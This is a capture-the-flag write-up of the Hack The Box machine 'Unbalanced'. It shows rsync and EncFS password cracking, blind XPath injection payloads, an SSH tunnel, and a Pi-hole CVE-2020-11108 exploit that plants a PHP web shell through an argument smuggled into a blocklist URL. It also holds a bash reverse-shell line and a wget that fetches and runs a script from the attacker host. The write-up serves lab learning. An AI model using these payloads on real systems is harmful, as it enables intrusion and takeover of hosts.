---
title: "Unbalanced : HTB writeup"
last_modified_at: 2021-02-13
categories:
  - HTB
author_profile: false
tags:
  - Linux Privilege Escalation
  - piHole
  - SSH Tunnelling
  - rsync
  - XPATH injection
  - HTB
  - Writeup
---

## Summary

* Configure proxy settings.

* Use **rsync** service to synchronize the directory.

* Decrypt files obtained from rsync service ( **encfs** encoded )

* Access the cache manager to get information regarding hosts.

* Use **XPath** injection to get credentials

* SSH tunneling to access pihole HTTP service and CVE for exploit.

## Nmap Scan

    **22/tcp**    open    ** ssh**        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0
    )**873/tcp**   open  **   rsync **     (protocol version 31)
    **3128/tcp**  open    ** http-proxy** Squid http proxy 4.6

## Squid Proxy: port 3128

On visiting the HTTP-proxy site:

![](https://cdn-images-1.medium.com/max/2000/1*OTlPXAAslgXgb1NgopFyrw.png)

Since it is a proxy so let’s set proxy on our browser. I use FoxyProxy extension to do that so let's add a new proxy

![](https://cdn-images-1.medium.com/max/2000/1*uWvCqOjD3HUHh-PLz6uCXA.png)

## Accessing port 80 of 10.10.10.200 using proxy

![](https://cdn-images-1.medium.com/max/2000/1*jfKPjjvgkHtJ4m2Xfe3brg.png)

Now we get a different error message, saying access denied. So there must be some access control mechanisms to allow specific websites.

Since rsync port is also open, let’s enumerate that port as well.

I didn’t know anything about rsync so I researched a bit on it and found this [article](https://www.digitalocean.com/community/tutorials/how-to-use-rsync-to-sync-local-and-remote-directories-on-a-vps) on digital ocean which explains what rsync is and what it does.

Folders on rsync

    $ rsync 10.10.10.200::
    conf_backups    EncFS-encrypted configuration backups

So we have conf_backups folder, let's sync it using rsync

    $ rsync -r 10.10.10.200::conf_backups .

![](https://cdn-images-1.medium.com/max/2000/1*ZSc3mhCeIsBY3Ihv62Wv5A.png)

So we can find that this is encfs encrypted data and we need a password to decode the data since we have .encfs6.xml file. Since we don't have password so let’s brute force the password.

## John to brute force the password

    $ /usr/share/john/encfs2john.py rsync/ > ro.john
    $ john --wordlist=/usr/share/wordlists/rockyou.txt ro.john

    We get : bubblegum

Let's decrypt the files using the password

    $ encfsctl export rsync/ ro/
    EncFS Password:

We get decrypted file in the ro/ directory.

![](https://cdn-images-1.medium.com/max/2000/1*_6YfdbiUF-cCo_UUXsvfJA.png)

We have squid.conf. Now, we have squid.conf file which has the configuration. Most of the line is commented.

    $ grep -v "^#" squid.conf | awk NF

    -v :invert the selection
    ^# :anything that starts with #
    awk NF :remove blank lines

    It removes all the commented and blank lines

Result:

    acl localnet src 0.0.0.1-0.255.255.255 # RFC 1122 "this" network (LAN)
    acl localnet src 10.0.0.0/8  # RFC 1918 local private network (LAN)
    acl localnet src 100.64.0.0/10  # RFC 6598 shared address space (CGN)
    acl localnet src 169.254.0.0/16  # RFC 3927 link-local (directly plugged) machines
    acl localnet src 172.16.0.0/12  # RFC 1918 local private network (LAN)
    acl localnet src 192.168.0.0/16  # RFC 1918 local private network (LAN)
    acl localnet src fc00::/7        # RFC 4193 local private network range
    acl localnet src fe80::/10       # RFC 4291 link-local (directly plugged) machines
    acl SSL_ports port 443
    acl Safe_ports port 80  # http
    acl Safe_ports port 21  # ftp
    acl Safe_ports port 443  # https
    acl Safe_ports port 70  # gopher
    acl Safe_ports port 210  # wais
    acl Safe_ports port 1025-65535 # unregistered ports
    acl Safe_ports port 280  # http-mgmt
    acl Safe_ports port 488  # gss-http
    acl Safe_ports port 591  # filemaker
    acl Safe_ports port 777  # multiling http
    acl CONNECT method CONNECT
    http_access deny !Safe_ports
    http_access deny CONNECT !SSL_ports
    http_access allow manager
    include /etc/squid/conf.d/*
    http_access allow localhost
    **acl intranet dstdomain -n intranet.unbalanced.htb**
    **acl intranet_net dst -n 172.16.0.0/12**
    **http_access allow intranet
    http_access allow intranet_net**
    **http_access deny all**
    http_port 3128
    coredump_dir /var/spool/squid
    refresh_pattern ^ftp:  1440 20% 10080
    refresh_pattern ^gopher: 1440 0% 1440
    refresh_pattern -i (/cgi-bin/|\?) 0 0% 0
    refresh_pattern .  0 20% 4320
    **cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache** **filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events**
    cachemgr_passwd disable all
    cache disable

**So there is access control list in the squid proxy which only allows the domain intranet.unbalanced.htb and IP 172.16.0.0/12 (we will need this later)**. Also, the password to the cache manager is provided with the following functions enabled

    **menu pconn mem diskd fqdncache** **filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events**

Lets first set the entry 10.10.10.200 to intranet.unbalanced.htb in the /etc/hosts file

    127.0.0.1       localhost
    **10.10.10.200 intranet.unbalanced.htb**
    # The following lines are desirable for IPv6 capable hosts
    ::1     localhost ip6-localhost ip6-loopback
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters

Accessing intranet.unbalanced.htb using a proxy. The default page redirects us to /intranet.php

![](https://cdn-images-1.medium.com/max/2000/1*nOdZMT6qsph7x98EkzyoVg.png)

I tried most of the injection techniques, but none of them worked.

We also have the password to cachemanager. [Documentation](https://wiki.squid-cache.org/Features/CacheManager#Feature:_Squid_Cache_Manager) states, we can access the cache manager using HTTP service.

![](https://cdn-images-1.medium.com/max/2000/1*nEjl9bnIK5V4ztPadOZxwA.png)

Also, the documentation says, the username can be anything. So, we have the password and username can be anything. Let’s access the cachemanager.

Since menu was enabled, accessing

    [http://10.10.10.200:3128/squid-internal-mgr/menu](http://10.10.10.200:3128/squid-internal-mgr/menu)

we get a prompt for user name and password

    creds::  <any_username>: **Thah$Sh1**

![](https://cdn-images-1.medium.com/max/2000/1*0QPyYm5883zqJ4zutoZXoA.png)

We can find some information on **fqdncache**

    [http://10.10.10.200:3128/squid-internal-mgr/fqdncache](http://10.10.10.200:3128/squid-internal-mgr/fqdncache)

![](https://cdn-images-1.medium.com/max/2000/1*KJSiFQS5uxoOa3l7jrdIug.png)

So, we have more virtual hosts.

    172.31.179.2               H -001   1 intranet-host2.unbalanced.htb
    172.31.179.3               H -001   1 intranet-host3.unbalanced.htb

Since squid proxy’s ACL provides access to intranet.unbalanced.htb we cannot access intranet-host{2,3}.unbalanced.htb by hostname. But 172.16.0.0/12 has access so we can access the sites using the ip address. [* If you dont know what 172.16.0.0/12 is google subnetting *]. 172.31.179.{2,3} lies in the accessible subnet so we can access those networks.

Both 172.31.179.2,172.31.179.3 shows us this page. Tried all kinds of injection but didn’t find anything.

![](https://cdn-images-1.medium.com/max/NaN/1*nOdZMT6qsph7x98EkzyoVg.png)

Since there is 172.31.179.{2,3}, I tried accessing 172.31.179.1

![](https://cdn-images-1.medium.com/max/2000/1*pSVwHAV0p7UXCs1zk0nSlA.png)

There was no redirection, so I manually tried accessing the intranet.php page. Again we get the same page,

![](https://cdn-images-1.medium.com/max/NaN/1*nOdZMT6qsph7x98EkzyoVg.png)

But this time we get some data on sqli njection payload. On setting both username and password to ' or '1'='1 we get

![](https://cdn-images-1.medium.com/max/2000/1*ScbE__3QHMfIWtH4JcKXxA.png)

Other payloads didn’t work. So fired up sqlmap to test, but it could not find any injection.

There was no more so, I asked a friend who solved this box for a nudge, he suggested me to try other injection techniques. I tried, XPath injection and it worked.

Since we have usernames rita , jim , bryan, sarah

Since bryan was administrator, I tried extracting the password of brian. [This](https://owasp.org/www-community/attacks/Blind_XPath_Injection) owasp article shows, how XPATH can be used and injection can be done.

Since the authentication request was a post request with parameters Username and Password . We have a username, so we needed to craft the Password query in such a way that we can extract data

### Possible implementation in the server-side

    $q = "nodes/node[Username='".$_POST['username']."'and passsword='".$_POST['Password']."']";

### Exploitation

    Now we have the username so the query becomes
    $q = nodes/node[Username='bryan' and password='<payload>']

    if payload = ' or <some-condition> or '2'='1

    On setting payload
    $q = nodes/node[Username='bryan' and Password='' or <some_condition> or '2'='1']

    Since '2' =1 is always false that and Password='' is also false so, the **output depends upon the condition of the some_condition**. The conditions could be 
    *** string-length of node-name : string-length()
    * count of child nodes in the parent node : count()
    * substrings of a string using : substring()**

In this case, if the condition is true, it outputs all the user data and if false, returns invalid credentials.

Extracting Root Node

    Username=bryan&Password=' or string-length(name(/*))=**var** or '2'='1
    #on iterating var we get 9
    Username=bryan&Password=' or substring(name(/*),**v**,1)='**var'** or '2'='1
    #iterating v from 1-9 and var through all ascii printable characters we get **Employees** as root node

Extracting number of child nodes

    Username=bryan&Password=' or count(/Employees/*)=**var** or '2'='1
    #on iterating we get 4 (number of entries we saw above)

Using the above method, we can extract other subnodes and password of the user Bryan

Extracting Length

    Username=bryan&Password=' or string-length(//Employee[position()=3]/Password)=**var** or '2'='1'

    Here: I directly used the node "Employee" and verified that position 3 was for user bryan by extracting //Employee[position()=3]/Username. Using the same method, we can extract the password as well and found the password to be

Credentials : bryan: ireallyl0vebubblegum!!!

Used this credentials to login as user bryan and got the shell

![](https://cdn-images-1.medium.com/max/2000/1*A38a2Sr97mNjhmX7pZCnJQ.png)

TODO file

![](https://cdn-images-1.medium.com/max/2000/1*WH_ll-xAKDZrILUWKsG-Lw.png)

The intranet part was clear as we had seen the same configuration above.

Pi-Hole docker was running. Pi-Hole is used to block ads in the whole network rather than using adblocker in specific devices.

Viewing ports that box is listening to

![](https://cdn-images-1.medium.com/max/2000/1*ILsO6iVt4RMy4qWOopUijw.png)

Here we can see it is listening to 5553 and 8080 on localhost i.e accessible only from inside.

So I used systemctl to view the status of docker

![](https://cdn-images-1.medium.com/max/2096/1*0lawtJsfsWuCbv3d6JVKPQ.png)

So the host port 8080 is mapped to container port 80.

![](https://cdn-images-1.medium.com/max/2000/1*i9NI4TEBvVLazC3H1uHOFw.png)

On googling the error I found it is about pi hole, so we are in right track.

In order to access using the browser, I tunnelled the port to port 8000.

## SSH tunnelling

    $ ssh -L 8000:127.0.0.1:8080 bryan@10.10.10.200

On accessing localhost:8000, still getting the same message.

![](https://cdn-images-1.medium.com/max/2000/1*7KQo0nc8hNZSE8oezNkkiA.png)

Since pihole has an admin interface, I tried accessing that

    http://localhost:8000/admin

![](https://cdn-images-1.medium.com/max/2000/1*NVypxJBoJDyMlQW49syo0A.png)

The login page asks for password

![](https://cdn-images-1.medium.com/max/2000/1*Ccyz7S15kejtDFwEJsjE6w.png)

On trying default credentials it worked with password **admin. **On bottom right corner we can see the version

    **Pi-hole Version **v4.3.2 **Web Interface Version **v4.3 **FTL Version **v4.3.1

## Exploiting CVE-2020–11108

This is better explained at h[ttps://frichetten.com/blog/cve-2020–11108-pihole-rce/](https://frichetten.com/blog/cve-2020-11108-pihole-rce/)

And this version has a vulnerability CVE-2020–11108. The author of cve has an [article](https://frichetten.com/blog/cve-2020-11108-pihole-rce/) on how to exploit this feature. If you want more details read the article.

What we need to do is add an entry to the blocklists. settings > blocklists

    **http://<your-ip-address>#" -o fun.php -d "**

Hit save and update and listen on port 80. After a few seconds we get a request on the listener. We need to send an HTTP 200 response.

![](https://cdn-images-1.medium.com/max/2000/1*ZzwmNAzlfiEjRLkxuXkbdw.png)

After closing the listener we can see

![](https://cdn-images-1.medium.com/max/2000/1*LDqueFCS2Gk3TJaJnY1GFw.png)

Now again listen to port 80 and click the update button.

![](https://cdn-images-1.medium.com/max/2000/1*G16vCtmUUcs0-v7Y1NsJaw.png)

If we don’t receive .domains then something might not be working. Hit enter and write a payload

![](https://cdn-images-1.medium.com/max/2000/1*ntR5fkgmbhYXE2dnuVN0EA.png)

I uploaded a PHP shell. To get the shell visit

    /admin/scripts/pi-hole/php/fun.php

**Checking reverse shell**

    [http://localhost:8000/admin/scripts/pi-hole/php/fun.php?cmd=whoami](http://localhost:8000/admin/scripts/pi-hole/php/fun.php?cmd=whoami)
    

I tried uploading php reverse shell using this web shell but it was not working for some reasons. So I wrote a simple bash reverse shell and uploaded it into /tmp

    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

**Uploaded the bash reverse shell to /tmp directory**

    [http://localhost:8000/admin/scripts/pi-hole/php/fun.php?cmd=wget%2010.10.14.125:8181/ro.sh%20-O%20/tmp/ro.sh](http://localhost:8000/admin/scripts/pi-hole/php/fun.php?cmd=wget%2010.10.14.125:8181/ro.sh%20-o%20/tmp/ro.sh)

![](https://cdn-images-1.medium.com/max/2000/1*V5PtW7S9TBT0rwtwCrYogg.png)

**Executing the script**

    [http://localhost:8000/admin/scripts/pi-hole/php/fun.php?cmd=/bin/](http://localhost:8000/admin/scripts/pi-hole/php/fun.php?cmd=/bin/bash%20/tmp/ro.sh)

We get a shell

![](https://cdn-images-1.medium.com/max/2000/1*RBBPLa9WJ7hMkXcURDHHLg.png)

The files in /root directory is readable by all

![](https://cdn-images-1.medium.com/max/2000/1*3LoAawrOebh3-D5My1h6-w.png)

The pihole_config.sh has a password.

![](https://cdn-images-1.medium.com/max/2000/1*72ZO8RU0RNZB-hQo_tyx0w.png)

Changing the user to root in the box using this password works.

    root: bUbBl3gUm$43v3Ry0n3!

![](https://cdn-images-1.medium.com/max/2000/1*iwAPz_O0pp7by2IPmA9Abw.png)

Finally, we owned the root user.

This was my first hard box. I learnt about proxy server, XPATH injection and how setting the same passwords in different services would be a bad idea. Also, services running on the system should be up to date to prevent attacks on newly released vulnerabilities.

This is how I rooted the box. If you feel anything could be done better, feel free to suggest me.
